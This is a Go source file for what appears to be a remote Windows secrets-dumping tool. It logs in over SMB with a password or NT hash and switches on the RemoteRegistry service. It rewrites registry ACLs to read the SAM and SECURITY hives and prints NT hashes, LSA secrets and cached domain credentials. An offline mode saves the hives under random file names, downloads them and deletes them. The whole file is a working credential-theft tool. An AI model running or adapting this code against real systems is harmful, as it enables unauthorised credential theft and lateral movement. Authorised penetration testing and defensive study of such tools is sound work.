// MIT License
//
// # Copyright (c) 2023 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"

	rundebug "runtime/debug"

	"golang.org/x/term"

	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/dcerpc"
	"github.com/jfjallid/go-smb/smb/dcerpc/msrrp"
	"github.com/jfjallid/golog"
)

var log = golog.Get("")
var release string = "0.1.4"

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func init() {
	rand.Seed(time.Now().UnixNano())
}

func getRandString(n int) string {
	arr := make([]rune, n)
	for i := range arr {
		arr[i] = letters[rand.Intn(len(letters))]
	}
	return string(arr)
}

func startRemoteRegistry(session *smb.Connection, share string) (started, disabled bool, err error) {
	f, err := session.OpenFile(share, "svcctl")
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.CloseFile()

	bind, err := dcerpc.Bind(f, dcerpc.MSRPCUuidSvcCtl, dcerpc.MSRPCSvcCtlMajorVersion, dcerpc.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
	if err != nil {
		log.Errorln("Failed to bind to service")
		log.Errorln(err)
		return
	}

	serviceName := "RemoteRegistry"

	status, err := bind.GetServiceStatus(serviceName)
	if err != nil {
		log.Errorln(err)
		return
	} else {
		if status == dcerpc.ServiceRunning {
			started = true
			disabled = false
			return
		}
		// Check if disabled
		config, err := bind.GetServiceConfig(serviceName)
		if err != nil {
			log.Errorf("Failed to get config of %s service with error: %v\n", serviceName, err)
			return started, disabled, err
		}
		if config.StartType == dcerpc.StartTypeStatusMap[dcerpc.ServiceDisabled] {
			disabled = true
			// Enable service
			err = bind.ChangeServiceConfig(serviceName, dcerpc.ServiceNoChange, dcerpc.ServiceDemandStart, dcerpc.ServiceNoChange, "", "", "")
			if err != nil {
				log.Errorf("Failed to change service config from Disabled to Start on Demand with error: %v\n", err)
				return started, disabled, err
			}
		}
		// Start service
		err = bind.StartService(serviceName)
		if err != nil {
			log.Errorln(err)
			return started, disabled, err
		}
		time.Sleep(time.Second)
	}
	return
}

func stopRemoteRegistry(session *smb.Connection, share string, disable bool) (err error) {
	log.Infoln("Trying to restore RemoteRegistry service status")
	f, err := session.OpenFile(share, "svcctl")
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.CloseFile()

	bind, err := dcerpc.Bind(f, dcerpc.MSRPCUuidSvcCtl, dcerpc.MSRPCSvcCtlMajorVersion, dcerpc.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
	if err != nil {
		log.Errorln("Failed to bind to service")
		log.Errorln(err)
		return
	}

	serviceName := "RemoteRegistry"

	// Stop service
	err = bind.ControlService(serviceName, dcerpc.ServiceControlStop)
	if err != nil {
		log.Errorln(err)
		return
	}
	log.Infoln("Service RemoteRegistry stopped")

	if disable {
		err = bind.ChangeServiceConfig(serviceName, dcerpc.ServiceNoChange, dcerpc.ServiceDisabled, dcerpc.ServiceNoChange, "", "", "")
		if err != nil {
			log.Errorf("Failed to change service config to Disabled with error: %v\n", err)
			return
		}
		log.Infoln("Service RemoteRegistry disabled")
	}

	return
}

func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string, m map[string]*msrrp.SecurityDescriptor) (map[string]*msrrp.SecurityDescriptor, error) {
	if m == nil {
		m = make(map[string]*msrrp.SecurityDescriptor)
	}

	for _, subkey := range keys {
		hSubKey, err := rpccon.OpenSubKey(base, subkey)
		if err != nil {
			if err == msrrp.ReturnCodeMap[msrrp.ErrorFileNotFound] {
				// Skip keys that do not exist
				continue
			}
			log.Errorln(err)
			return nil, err
		}
		//Retrieving security settings
		sd, err := rpccon.GetKeySecurity(hSubKey)
		if err != nil {
			rpccon.CloseKeyHandle(hSubKey)
			log.Errorln(err)
			return nil, err
		}
		// Check if key exists before adding to map.
		// Don't want to replace an existing key in case I change the ACL twice
		if _, ok := m[subkey]; !ok {
			m[subkey] = sd
		}

		mask := msrrp.PermWriteDacl | msrrp.PermReadControl | msrrp.PermKeyEnumerateSubKeys | msrrp.PermKeyQueryValue
		ace, err := msrrp.NewAce(sid, mask, msrrp.AccessAllowedAceType, msrrp.ContainerInheritAce)
		if err != nil {
			rpccon.CloseKeyHandle(hSubKey)
			delete(m, subkey)
			log.Errorln(err)
			return nil, err
		}
		// NOTE Can't set owner, group or SACL, since I only have WriteDacl on SAM\SAM
		newSd, err := msrrp.NewSecurityDescriptor(sd.Control, nil, nil, msrrp.NewACL(append([]msrrp.ACE{*ace}, sd.Dacl.ACLS...)), nil)

		err = rpccon.SetKeySecurity(hSubKey, newSd)
		if err != nil {
			rpccon.CloseKeyHandle(hSubKey)
			delete(m, subkey)
			log.Errorln(err)
			return nil, err
		}
		rpccon.CloseKeyHandle(hSubKey)
	}
	return m, nil
}

func revertDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, m map[string]*msrrp.SecurityDescriptor) error {
	var sd *msrrp.SecurityDescriptor
	var ok bool
	for _, subkey := range keys {
		if sd, ok = m[subkey]; !ok {
			// Key did not exist so was not added to map
			continue
		}
		hSubKey, err := rpccon.OpenSubKey(base, subkey)
		if err != nil {
			log.Errorln(err)
			continue // Try to change as many keys as possible
		}
		sd.Control &^= msrrp.SecurityDescriptorFlagSP
		sd.OffsetSacl = 0
		sd.OwnerSid = nil
		sd.GroupSid = nil
		sd.OffsetOwner = 0
		sd.OffsetGroup = 0

		err = rpccon.SetKeySecurity(hSubKey, sd)
		if err != nil {
			log.Errorln(err)
			rpccon.CloseKeyHandle(hSubKey)
			continue
		}
		rpccon.CloseKeyHandle(hSubKey)
	}
	return nil
}

func tryRollbackChanges(rpccon *msrrp.RPCCon, hKey []byte, keys []string, m map[string]*msrrp.SecurityDescriptor) error {
	log.Infoln("Attempting to restore security descriptors")
	// Rollback changes in reverse order
	for i, j := 0, len(keys)-1; i < j; i, j = i+1, j-1 {
		keys[i], keys[j] = keys[j], keys[i]
	}
	err := revertDacl(rpccon, hKey, keys, m)
	if err != nil {
		log.Errorln(err)
		return err
	}
	return nil
}

func downloadAndDeleteFile(session *smb.Connection, localFilename, remotePath string) (err error) {
	// Convert to valid remote path
	parts := strings.Split(remotePath, ":\\")
	if len(parts) > 1 {
		remotePath = parts[1]
	}

	f, err := os.OpenFile(localFilename, os.O_CREATE|os.O_TRUNC|os.O_RDWR, 0600)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.Close()

	// Call library function to retrieve the file
	log.Infof("Trying to download remote file C:\\%s\n", remotePath)
	err = session.RetrieveFile("C$", remotePath, 0, f.Write)
	if err != nil {
		log.Errorf("Failed to retrieve remote file C:\\%s with error: %s\n", remotePath, err)
	} else {
		log.Infof("Successfully downloaded %s\n", remotePath)
	}

	// Remove the remote files
	log.Infof("Trying to delete remote file C:\\%s\n", remotePath)
	err = session.DeleteFile("C$", remotePath)
	if err != nil {
		log.Errorf("Failed to delete remote file C:\\%s with error: %s\n", remotePath, err)
		return
	} else {
		log.Infof("Successfully deleted remote file C:\\%s\n", remotePath)
	}

	return
}

func dumpOffline(session *smb.Connection, rpccon *msrrp.RPCCon, hKey []byte, dst string) (err error) {

	log.Infoln("Attempting to dump SAM and SECURITY hives to disk and then retrieve the files for local parsing using some other tool")
	windowsPath := strings.ReplaceAll(dst, "/", "\\")
	// Ensure the path ends with a backslash
	if !strings.HasSuffix(windowsPath, "\\") {
		windowsPath += "\\"
	}
	samPath := windowsPath + getRandString(7) + ".log"
	securityPath := windowsPath + getRandString(7) + ".log"

	// Dump SAM
	// Open a key handle
	hSubKey, err := rpccon.OpenSubKey(hKey, "SAM")
	if err != nil {
		log.Errorln(err)
		return
	}
	err = rpccon.RegSaveKey(hSubKey, samPath, "")
	if err != nil {
		log.Errorln(err)
		rpccon.CloseKeyHandle(hSubKey)
		return
	}
	rpccon.CloseKeyHandle(hSubKey)
	log.Infof("Dumped SAM hive to %s\n", samPath)

	// Retrieve the file
	err = downloadAndDeleteFile(session, "sam.dmp", samPath)
	if err != nil {
		log.Errorln(err)
		return
	}

	// Dump SECURITY
	// Open a key handle
	hSubKey, err = rpccon.OpenSubKey(hKey, "SECURITY")
	if err != nil {
		log.Errorln(err)
		return
	}
	err = rpccon.RegSaveKey(hSubKey, securityPath, "")
	if err != nil {
		log.Errorln(err)
		rpccon.CloseKeyHandle(hSubKey)
		return
	}
	rpccon.CloseKeyHandle(hSubKey)
	log.Infof("Dumped SECURITY hive to %s\n", securityPath)

	// Retrieve the file
	err = downloadAndDeleteFile(session, "security.dmp", securityPath)
	if err != nil {
		log.Errorln(err)
		return
	}

	// Dump the bootkey
	bootkey, err := getBootKey(rpccon, hKey)
	if err != nil {
		log.Errorf("Failed to extract the Bootkey from the SYSTEM hive with error: %s\n", err)
		return
	}

	fmt.Println("Downloaded SAM and SECURITY hives to local files sam.dmp and security.dmp")
	fmt.Printf("Bootkey for decrypting SAM and SECURITY hives: %x\n", bootkey)

	return nil
}

func dumpOnline(rpccon *msrrp.RPCCon, hKey []byte) error {
	log.Noticeln("Performing an online dump of secrets from the registry")
	// Most of the registry keys needed for extracting secrets from the registry.
	// The local group "administrators" has WriteDACL on HKLM:\\SAM\SAM so that
	// SID is used for the temporary increase in privileges.
	// Note that this list is extended with dynamically discovered SIDs for
	// local users.
	sid := "S-1-5-32-544"
	keys := []string{
		`SAM\SAM`,
		`SAM\SAM\Domains`,
		`SAM\SAM\Domains\Account`,
		`SAM\SAM\Domains\Account\Users`,
		`SECURITY\Policy\Secrets`,
		`SECURITY\Policy\Secrets\NL$KM`,
		`SECURITY\Policy\Secrets\NL$KM\CurrVal`,
		`SECURITY\Cache`,
		`SECURITY\Policy\PolEKList`,
		`SECURITY\Policy\PolSecretEncryptionKey`,
	}

	// Grant temporarily higher permissions to the local administrators group
	m, err := changeDacl(rpccon, hKey, keys, sid, nil)
	if err != nil {
		log.Errorln(err)
		return err
	}

	// Get RIDs of local users
	keyUsers := `SAM\SAM\Domains\Account\Users`
	rids, err := rpccon.GetSubKeyNames(hKey, keyUsers)
	if err != nil {
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return err
		}
	}

	rids = rids[:len(rids)-1]
	for i := range rids {
		rids[i] = fmt.Sprintf("%s\\%s", keyUsers, rids[i])
	}

	// Extend the list of keys that have temporarily altered permissions
	keys = append(keys, rids...)
	// Grant temporarily higher permissions to the local administrators group
	m, err = changeDacl(rpccon, hKey, rids, sid, m)
	if err != nil {
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return err
		}
		return err
	}

	syskey, err := getSysKey(rpccon, hKey)
	if err != nil {
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return err
		}
		return err
	}

	// Gather credentials/secrets
	creds, err := getNTHash(rpccon, hKey, rids)
	if err != nil {
		log.Errorln(err)
		// Try to get other secrets instead of hard fail
	} else {
		for _, cred := range creds {
			fmt.Printf("Name: %s\n", cred.Username)
			fmt.Printf("RID: %d\n", cred.RID)
			if len(cred.Data) == 0 {
				fmt.Printf("NT: <empty>\n\n")
				continue
			}
			var hash []byte
			if cred.AES {
				hash, err = DecryptAESHash(cred.Data, cred.IV, syskey, cred.RID)
			} else {
				hash, err = DecryptRC4Hash(cred.Data, syskey, cred.RID)
			}
			fmt.Printf("NT: %x\n\n", hash)
		}
	}

	// Get names of lsa secrets
	keySecrets := `SECURITY\Policy\Secrets`
	secrets, err := rpccon.GetSubKeyNames(hKey, keySecrets)
	if err != nil {
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return err
		}
		return err
	}
	newSecrets := make([]string, 0, len(secrets)*2)
	for i := range secrets {
		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s", keySecrets, secrets[i]))
		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
	}

	keys = append(keys, newSecrets...)
	m, err = changeDacl(rpccon, hKey, newSecrets, sid, m)
	if err != nil {
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return err
		}
		return err
	}

	lsaSecrets, err := GetLSASecrets(rpccon, hKey, false)
	if err != nil {
		log.Noticeln("Failed to get lsa secrets")
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return err
		}
		return err
	}
	if len(lsaSecrets) > 0 {
		fmt.Println("[*] LSA Secrets:")
		for _, secret := range lsaSecrets {
			fmt.Println(secret.secretType)
			for _, item := range secret.secrets {
				fmt.Println(item)
			}
			if secret.extraSecret != "" {
				fmt.Println(secret.extraSecret)
			}
		}
	}

	cachedHashes, err := GetCachedHashes(rpccon, hKey)
	if err != nil {
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return err
		}
		return err
	}

	if len(cachedHashes) > 0 {
		fmt.Println("[*] Dumping cached domain logon information (domain/username:hash)")
		for _, secret := range cachedHashes {
			fmt.Println(secret)
		}
	}

	//Revert changes
	err = tryRollbackChanges(rpccon, hKey, keys, m)
	if err != nil {
		log.Errorln(err)
		return err
	}

	log.Infoln("Restored permissions on ACLs")

	return nil
}

var helpMsg = `
    Usage: ` + os.Args[0] + ` [options]

    options:
          --host                Hostname or ip address of remote server
      -P, --port                SMB Port (default 445)
      -d, --domain              Domain name to use for login
      -u, --user                Username
      -p, --pass                Password
          --hash                Hex encoded NT Hash for user password
          --local               Authenticate as a local user instead of domain user
          --dump                Saves the SAM and SECURITY hives to disk and
                                transfers them to the local machine.
      -t, --timeout             Dial timeout in seconds (default 5)
          --noenc               Disable smb encryption
          --smb2                Force smb 2.1
          --debug               Enable debug logging
          --verbose             Enable verbose logging
      -v, --version             Show version
`

func main() {
	var host, username, password, hash, domain string
	var port, dialTimeout int
	var debug, noEnc, forceSMB2, localUser, dump, version, verbose bool
	var err error

	flag.Usage = func() {
		fmt.Println(helpMsg)
		os.Exit(0)
	}

	flag.StringVar(&host, "host", "", "")
	flag.StringVar(&username, "u", "", "")
	flag.StringVar(&username, "user", "", "")
	flag.StringVar(&password, "p", "", "")
	flag.StringVar(&password, "pass", "", "")
	flag.StringVar(&hash, "hash", "", "")
	flag.StringVar(&domain, "d", "", "")
	flag.StringVar(&domain, "domain", "", "")
	flag.IntVar(&port, "P", 445, "")
	flag.IntVar(&port, "port", 445, "")
	flag.BoolVar(&debug, "debug", false, "")
	flag.BoolVar(&verbose, "verbose", false, "")
	flag.BoolVar(&noEnc, "noenc", false, "")
	flag.BoolVar(&forceSMB2, "smb2", false, "")
	flag.BoolVar(&localUser, "local", false, "")
	flag.BoolVar(&dump, "dump", false, "")
	flag.IntVar(&dialTimeout, "t", 5, "")
	flag.IntVar(&dialTimeout, "timeout", 5, "")
	flag.BoolVar(&version, "v", false, "")
	flag.BoolVar(&version, "version", false, "")

	flag.Parse()

	if debug {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		log.SetFlags(golog.LstdFlags | golog.Lshortfile)
		log.SetLogLevel(golog.LevelDebug)
	} else if verbose {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		log.SetLogLevel(golog.LevelInfo)
	} else {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
	}

	if version {
		fmt.Printf("Version: %s\n", release)
		bi, ok := rundebug.ReadBuildInfo()
		if !ok {
			log.Errorln("Failed to read build info to locate version imported modules")
		}
		for _, m := range bi.Deps {
			fmt.Printf("Package: %s, Version: %s\n", m.Path, m.Version)
		}
		return
	}

	share := ""
	var hashBytes []byte

	if host == "" {
		log.Errorln("Must specify a hostname")
		flag.Usage()
		return
	}

	if dialTimeout < 1 {
		log.Errorln("Valid value for the timeout is > 0 seconds")
		return
	}

	if hash != "" {
		hashBytes, err = hex.DecodeString(hash)
		if err != nil {
			fmt.Println("Failed to decode hash")
			log.Errorln(err)
			return
		}
	}

	if (password == "") && (hashBytes == nil) {
		fmt.Printf("Enter password: ")
		passBytes, err := term.ReadPassword(int(os.Stdin.Fd()))
		fmt.Println()
		if err != nil {
			log.Errorln(err)
			return
		}
		password = string(passBytes)
	}

	timeout, err := time.ParseDuration(fmt.Sprintf("%ds", dialTimeout))
	if err != nil {
		log.Errorln(err)
		return
	}
	options := smb.Options{
		Host: host,
		Port: port,
		Initiator: &smb.NTLMInitiator{
			User:      username,
			Password:  password,
			Hash:      hashBytes,
			Domain:    domain,
			LocalUser: localUser,
		},
		DisableEncryption: noEnc,
		ForceSMB2:         forceSMB2,
		DialTimeout:       timeout,
	}

	session, err := smb.NewConnection(options)
	if err != nil {
		log.Criticalln(err)
		return
	}
	defer session.Close()

	if session.IsSigningRequired.Load() {
		log.Noticeln("[-] Signing is required")
	} else {
		log.Noticeln("[+] Signing is NOT required")
	}

	if session.IsAuthenticated {
		log.Noticeln("[+] Login successful")
	} else {
		log.Noticeln("[-] Login failed")
	}

	// Connect to IPC$ share
	share = "IPC$"
	err = session.TreeConnect(share)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer session.TreeDisconnect(share)

	// Check if RemoteRegistry is running, and if not, enable it
	registryStarted, registryDisabled, err := startRemoteRegistry(session, share)
	if err != nil {
		log.Errorln(err)
		return
	}

	defer func() {
		if !registryStarted {
			stopRemoteRegistry(session, share, registryDisabled)
		}
	}()

	// Open connection to Windows Remote Registry pipe
	f, err := session.OpenFile(share, msrrp.MSRRPPipe)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.CloseFile()

	// Bind to Windows Remote Registry service
	bind, err := dcerpc.Bind(f, msrrp.MSRRPUuid, msrrp.MSRRPMajorVersion, msrrp.MSRRPMinorVersion, msrrp.NDRUuid)
	if err != nil {
		log.Errorln("Failed to bind to service")
		log.Errorln(err)
		return
	}

	// RPCCon is a wrapper for an RPC Bind that implements the Remote Registry functions
	rpccon := msrrp.NewRPCCon(bind)

	hKey, err := rpccon.OpenBaseKey(msrrp.HKEYLocalMachine)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer rpccon.CloseKeyHandle(hKey)

	if dump {
		err = dumpOffline(session, rpccon, hKey, "C:/windows/temp")
	} else {
		err = dumpOnline(rpccon, hKey)
	}
	if err != nil {
		log.Errorln(err)
	}

}
